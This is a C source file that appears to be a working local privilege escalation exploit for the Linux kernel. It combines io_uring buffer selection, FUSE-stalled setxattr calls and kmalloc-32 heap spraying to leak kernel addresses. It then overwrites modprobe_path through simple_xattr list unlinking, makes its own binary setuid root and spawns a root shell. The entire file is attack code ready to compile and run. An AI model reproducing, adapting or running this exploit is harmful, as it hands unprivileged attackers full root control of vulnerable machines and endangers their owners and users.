#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <liburing.h>
#include <stdlib.h>
#include <sched.h>
#include <sys/xattr.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <unistd.h>
#include "util.h"
#include "hello.h"

#define QUEUE_DEPTH 2048
#define BLOCK_SZ 1024
#define BUFFERS_COUNT 1024
#define BUF_SIZE 32
#define GROUP_ID 1337

#define MS_REC 16384
#define MS_PRIVATE (1 << 18)

char bufs[BUFFERS_COUNT][BUF_SIZE] = {0};

struct io_uring_sqe *sqe;
struct io_uring_cqe *cqe;
char buf[2000];
sem_t *semaphore1, *semaphore2;
unsigned long *modprobe_path_plus1, *security_a, *slash_tmp;

static int migrate_to_cpu0(struct io_ring *ring)
{
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(0, &set);

    if (sched_setaffinity(getpid(), sizeof(set), &set) == -1)
    {
        perror("[-] sched_setaffinity");
        return -1;
    }

    if (io_uring_register_iowq_aff(ring, sizeof(set), &set) == -1)
    {
        perror("[-] io_uring_register_iowq_aff");
        return -1;
    }

    return 0;
}

void provide_io_buffers(struct io_uring *ring)
{
    sqe = io_uring_get_sqe(ring);
    io_uring_prep_provide_buffers(sqe, bufs, BUF_SIZE, BUFFERS_COUNT, GROUP_ID, 0);

    io_uring_submit(ring);
    io_uring_wait_cqe(ring, &cqe);
    if (cqe->res < 0)
    {
        printf("cqe->res = %d\n", cqe->res);
        exit(1);
    }
    io_uring_cqe_seen(ring, cqe);
}

void arb_free(struct io_ring *ring)
{

    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);

    read_file("/proc/self/maps", 2000);

    int fd = open("/proc/self/maps", O_RDONLY);

    memset(buf, 0, 2000);

    io_uring_prep_read(sqe, fd, buf, 2000, 0);
    io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
    sqe->buf_group = GROUP_ID;
    io_uring_submit(ring);

    struct io_uring_cqe *cqe;
    int ret = io_uring_wait_cqe(ring, &cqe);
    if (ret < 0)
    {
        perror("io_uring_wait_cqe");
        return 1;
    }
    if (cqe->res < 0)
    {
        fprintf(stderr, "Async read failed: %d\n", cqe->res);
        return 1;
    }

    io_uring_cqe_seen(ring, cqe);
}

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp, ret;
    char edit[0x100];
    ret = unshare(CLONE_NEWNS | CLONE_NEWUSER);
    if (ret < 0)
    {
        perror("unshare");
    }
    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);
    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);
    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
    ret = mount("none", "/", NULL, MS_REC | MS_PRIVATE, NULL);
    if (ret < 0)
    {
        perror("mount");
    }
    return;
}

int main(int argc, char *argv[])
{

    // If suid bit is set, and owned by root, just pop shell

    uid_t euid = geteuid();

    if (euid == 0)
    {
        // Got root!
        printf("Popping shell!\n");
        // Set uid and gid
        setuid(0);
        setgid(0);
        char *args[] = {"/bin/sh", NULL};
        execve("/bin/sh", args, NULL);
        // should not get here
        return 0;
    }

    // Get current binary path
    char* dir_path = malloc(0x200);
    getcwd(dir_path, 0x200);
    char* path = malloc(strlen(dir_path)+8);
    sprintf(path, "%s/exp", dir_path);

    semaphore1 = make_semaphore(0);
    semaphore2 = make_semaphore(0);
    sem_t *sem_read_1 = make_semaphore(0);
    sem_t *sem_read_2 = make_semaphore(0);
    sem_t *sem_write = make_semaphore(0);
    sem_t* sem_pop_shell = make_semaphore(0);

    modprobe_path_plus1 = make_shared_long();
    security_a = make_shared_long();
    slash_tmp = make_shared_long();

    // suid bit set, rerun as root
    if(!fork()){
        sem_wait(sem_pop_shell);
        char *args[] = {path, NULL};
        execve(path, args, NULL);
    }

    // Create a file for setting regular xattributes
    write_file("/tmp/x", "hello", 5);

    struct io_uring_params params;
    struct io_uring ring;
    int ret, qid;
    memset(buf, 0x41, 0x100);
    memset(&params, 0, sizeof(params));

    // Initialize io_uring
    if (io_uring_queue_init_params(2048, &ring, &params) < 0)
    {
        perror("io_uring_init_failed...\n");
        exit(-1);
    }

    // Make sure everything runs on the same CPU
    migrate_to_cpu0(&ring);

    setup_fuse();

    // Basically what `unshare -r -m` does
    // Setting simple_xattrs in security namespace requires CAP_SYS_ADMIN
    unshare_setup(getuid(), getgid());

    // Mount tmpfs
    system("mkdir /tmp/tmpfs");
    system("mount -t tmpfs -o size=50M none /tmp/tmpfs");
    // Create the two files we will set simple_xattrs on
    write_file("/tmp/tmpfs/x", "hello", 5);
    write_file("/tmp/tmpfs/y", "hello", 5);

    // mmap 3 pages that fall just before the 3 memory regions we will mmap to FUSE
    unsigned long mem1 = mmap(FUSE_MEM_ADDR - 0x1000, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, 0, 0);
    if (mem1 != FUSE_MEM_ADDR - 0x1000)
    {
        perror("mmap 1");
        exit(-1);
    }
    unsigned long mem2 = mmap(FUSE_MEM_ADDR2 - 0x1000, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, 0, 0);
    if (mem2 != FUSE_MEM_ADDR2 - 0x1000)
    {
        perror("mmap 2");
        exit(-1);
    }
    unsigned long mem3 = mmap(FUSE_MEM_ADDR3 - 0x1000, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, 0, 0);
    if (mem3 != FUSE_MEM_ADDR3 - 0x1000)
    {
        perror("mmap 3");
        exit(-1);
    }


    memset(mem1, 0x41, 0x1000);
    memset(mem2, 0x41, 0x1000);
    memset(mem3, 0x41, 0x1000);

    // Create processes earlier so it doesn't mess up kmalloc-32
    // For read 1
    if (!fork())
    {
        sem_wait(sem_read_1);
        // Allow 0x20-8 bytes to be immediately copied
        // copy_from_user blocks on remaining 8 bytes
        // xattr value buf gets freed
        // Hopefully gets reallocated to the shm_file_data struct that we want to leak
        // shm_file_data overwrites first 24 bytes with useful information
        // copy_from_user is unblocked, allowing the xattr to be set with 24 bytes of leaked data 
        // from the shm_file_data struct
        if (setxattr("/tmp/x", "user.a", FUSE_MEM_ADDR - (0x20 - 0x8), 0x20 - 1, 0) == -1)
        {
            perror("setxattr");
        }
        sleep(0x100000);
    }
    if (!fork())
    {
        sem_wait(sem_read_2);
        // Basically the same as the other read
        if (setxattr("/tmp/x", "user.a2", FUSE_MEM_ADDR2 - (0x20 - 0x8), 0x20 - 1, 0) == -1)
        {
            perror("setxattr");
        }
        sleep(0x100000);
    }
    if (!fork())
    {
        sem_wait(sem_write);

        // In this case, we are writing to the freed simple_xattr buffer
        // 0x20-8 bytes from the non-FUSE page are immediately copied
        // copy_from_user blocks forever (prevents double free)
        // We don't need to change the 4th qword
        unsigned long base_address = FUSE_MEM_ADDR3 - (0x20 - 0x8);
        
        // `slash_tmp` is written to next->prev which is offset 8 bytes from next
        // so subtract 8 bytes to offset this
        unsigned long modprobe_path_plus1_prev = *modprobe_path_plus1 - 8;

        // simple_xattr->next
        memcpy(base_address, &modprobe_path_plus1_prev, 8);
        // simple_xattr->prev
        memcpy(base_address + 8, slash_tmp, 8);
        // simple_xattr->name
        memcpy(base_address + 16, security_a, 8);

        // This should never return
        int ret = setxattr("/tmp/x", "user.b", base_address, 0x20 - 1, 0);
        printf("setxattr ret: %d\n", ret);
        if (ret == -1)
        {
            perror("setxattr");
        }
        sleep(0x100000);
        return;
    }

    // Stage 1: Leak kernel base

    // Fill up holes in kmalloc-32
    spray_kmalloc32(0x50);
    // Create a bunch of io_buffer
    provide_io_buffers(&ring);

    // Start setxattr
    sem_post(sem_read_1);
    // Wait for malloc just after final io_buffer
    sem_wait(semaphore1);
    // Free xattr buf
    arb_free(&ring);
    // Spray structs containing shm_file_data
    spray_kmalloc32(0x5);
    // Finish copying data into final 8 bytes
    sem_post(semaphore2);
    sleep(1);
    ret = getxattr("/tmp/x", "user.a", buf, 0x20 - 1);
    if (ret < 0)
    {
        perror("getxattr");
    }
    unsigned long *long_buf = (unsigned long *)buf;
    unsigned long leak = long_buf[1];
    // We add 1 to the modprobe path address because
    // the first character is / and we don't need to change that
    *modprobe_path_plus1 = (leak - 1384480+1);
    printf("Leaked modprobe_path: %p\n", leak - 1384480);


    // Stage 2 leak an address of "security.a"

    // Basically the same as stage 1
    spray_kmalloc32(0x50);
    provide_io_buffers(&ring);
    sem_post(sem_read_2);
    sem_wait(semaphore1);
    arb_free(&ring);
    // Create simple_xattr (kmalloced into kmalloc-32)
    // Contains pointer to name of simple_xattr (security.a)
    setxattr("/tmp/tmpfs/y", "security.a", buf, 0, 0);
    sleep(1);
    sem_post(semaphore2);
    sleep(1);
    ret = getxattr("/tmp/x", "user.a2", buf, 0x20 - 1);
    if (ret < 0)
    {
        perror("getxattr");
    }
    if (long_buf[2] == 0)
    {
        exit(-1);
    }
    printf("Leaked address of security.a: %p \n", long_buf[2]);
    *security_a = long_buf[2];
    unsigned long heap = long_buf[2] & 0xffffffff00000000;
    printf("Leaked physmap: %p\n", heap);
    *slash_tmp = heap + 0x2f706d74;
    // If physmap starts after 0ffffxxxx20000000, add 0x100000000
    // For 0-2 probably fine as is
    // 3-7 will probably not have enough physmap to rollover to next digit (depends on number of physmapped pages)
    // 8-f will probably work with next digit
    if (((long_buf[2]&0xf0000000)>>28) > 0x2){
        *slash_tmp += 0x100000000;
    }
    printf("Using %p as 0ffffxxxx2f706d74\n", *slash_tmp);

    // Stage 3: use 'unlinking' to write modprobe_path

    spray_kmalloc32(0x50);
    provide_io_buffers(&ring);
    ret = setxattr("/tmp/tmpfs/x", "security.a", buf, 0, 0);
    if (ret < 0)
    {
        perror("setxattr write");
    }
    // Free simple_xattr
    arb_free(&ring);
    // Start write
    sem_post(sem_write);
    sleep(1);
    // simple_xattr->next is now modprobe_path + 1
    // simple_xattr->prev is now 0ffffxxxx2f706d74
    // When removed, simple_xattr->next->prev = simple_xattr->prev
    // Ie *(modprobe_path + 1) = 0ffffxxxx2f706d74
    removexattr("/tmp/tmpfs/x", "security.a");

    // Pretty standard stuff from here
    printf("Modprobe path: %s\n", read_file("/proc/sys/kernel/modprobe", 0x10));

    // Set suid bit on this file and make root the owner

    char *script = malloc(0x200);
    char *modprobe_path = malloc(0x20);

    sprintf(script, "#!/bin/bash\nchown root:root %s\nchmod u+s %s\n", path, path);
    sprintf(modprobe_path,"/%sprobe", slash_tmp);
    write_file(modprobe_path, script, strlen(script));

    sprintf(script, "chmod 700 %s\n", modprobe_path);
    system(script);

    // Write file starting with ffff (does not match and type of file)
    // OS will execute script at modprobe_path to try to identify file type
    write_file("/tmp/z", "\xff\xff\xff\xff\xff\xff\0", 6);
    system("chmod 700 /tmp/z");

    // Trigger modprobe_path
    system("/tmp/z 2>/dev/null");
    printf("setuid bit set\n");


    // Part 4: Pop shell
    sem_post(sem_pop_shell);
    wait(NULL);
    sleep(0x100000);
}
